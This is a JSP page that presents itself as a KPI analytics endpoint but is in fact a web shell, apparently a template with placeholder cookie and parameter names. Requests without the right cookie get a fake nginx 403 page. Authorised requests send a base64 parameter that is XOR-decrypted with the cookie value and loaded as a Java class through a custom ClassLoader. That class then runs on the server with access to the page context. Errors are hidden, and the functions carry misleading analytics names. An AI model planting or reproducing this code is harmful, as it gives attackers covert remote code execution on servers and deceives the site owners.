<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%!
    /**
     * User Analytics Aggregator
     * Simulates KPI analytics endpoint that ingests compressed metric frames.
     */
    public static class AnalyticsFrameHelper {
        private static final String LOOKUP = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

        public static byte[] decodeFrame(String frame) {
            try {
                java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
                int i = 0;
                int bits = 0;
                int bitCount = 0;
                while (i < frame.length()) {
                    char c = frame.charAt(i++);
                    if (c == '=') break;
                    int v = LOOKUP.indexOf(c);
                    if (v == -1) continue;
                    bits = (bits << 6) | v;
                    bitCount += 6;
                    if (bitCount >= 8) {
                        bitCount -= 8;
                        out.write((bits >> bitCount) & 0xFF);
                    }
                }
                return out.toByteArray();
            } catch (Exception e) {
                return null;
            }
        }

        public static byte[] normalize(byte[] payload, String token) {
            try {
                byte[] key = token.getBytes("UTF-8");
                byte[] result = new byte[payload.length];
                for (int i = 0; i < payload.length; i++) {
                    result[i] = (byte) (payload[i] ^ key[i % key.length]);
                }
                return result;
            } catch (Exception e) {
                return null;
            }
        }
    }

    class AnalyticsModuleLoader extends ClassLoader {
        public AnalyticsModuleLoader(ClassLoader parent) {
            super(parent);
        }

        public Class hydrate(byte[] data) {
            return super.defineClass(data, 0, data.length);
        }
    }
%>

<%
    final String TOKEN_COOKIE = "$cookie_name$";
    final String CACHE_KEY = "cache_key";
    final String FRAME_PARAM = "$param$";
    String authToken = null;
    boolean verified = false;

    javax.servlet.http.Cookie[] cookies = request.getCookies();
    if (cookies != null) {
        for (javax.servlet.http.Cookie cookie : cookies) {
            if (TOKEN_COOKIE.equals(cookie.getName())) {
                authToken = cookie.getValue();
                verified = true;
                break;
            }
        }
    }

    if (!verified) {
        response.setStatus(403);
%>
<html>
<head>
    <title>403 Forbidden</title>
</head>
<body bgcolor="white">
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx</center>
</body>
</html>
<%
        return;
    }

    try {
        if (session.getAttribute(CACHE_KEY) == null) {
            String analyticsFrame = request.getParameter(FRAME_PARAM);
            if (analyticsFrame != null && authToken != null && authToken.length() > 0) {
                byte[] payload = AnalyticsFrameHelper.decodeFrame(analyticsFrame);
                payload = AnalyticsFrameHelper.normalize(payload, authToken);
                try {
                    Class component = new AnalyticsModuleLoader(this.getClass().getClassLoader()).hydrate(payload);
                    session.setAttribute(CACHE_KEY, component);
                } catch (Exception ignored) {
                    return;
                }
            }
        } else {
            java.io.ByteArrayOutputStream resultCollector = new java.io.ByteArrayOutputStream();
            Object analyticsComponent = ((Class) session.getAttribute(CACHE_KEY)).newInstance();
            analyticsComponent.equals(resultCollector);
            analyticsComponent.equals(pageContext);
            analyticsComponent.toString();
        }
    } catch (Exception e) {
        // keep silent
    }
%>
